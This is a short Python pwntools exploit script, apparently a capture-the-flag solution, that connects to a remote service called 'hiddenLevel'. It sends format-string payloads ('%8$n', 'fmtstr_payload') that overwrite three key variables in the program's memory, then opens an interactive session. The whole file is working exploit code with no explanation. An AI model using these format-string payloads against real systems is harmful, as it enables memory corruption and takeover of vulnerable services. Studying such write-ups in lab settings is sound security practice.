#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.log_level = "debug"

#  io = process("./hiddenLevel")
io = remote("10.4.21.55", 9999)
elf = ELF("./hiddenLevel")
io.recvuntil("0x")
key3_addr = int(io.recvuntil("\n", drop = True), 16)
key2_addr = elf.symbols["key2"]
key1_addr = elf.symbols["key1"]

payload = "00%8$n.." + p32(key1_addr)
io.sendline(payload)
payload = fmtstr_payload(6, {key2_addr: 0x12345678})
io.sendline(payload)
payload = p32(key3_addr) + "%12c" + "%6$n"
io.sendline(payload)

io.sendline("pwn!")
io.interactive()
io.close()
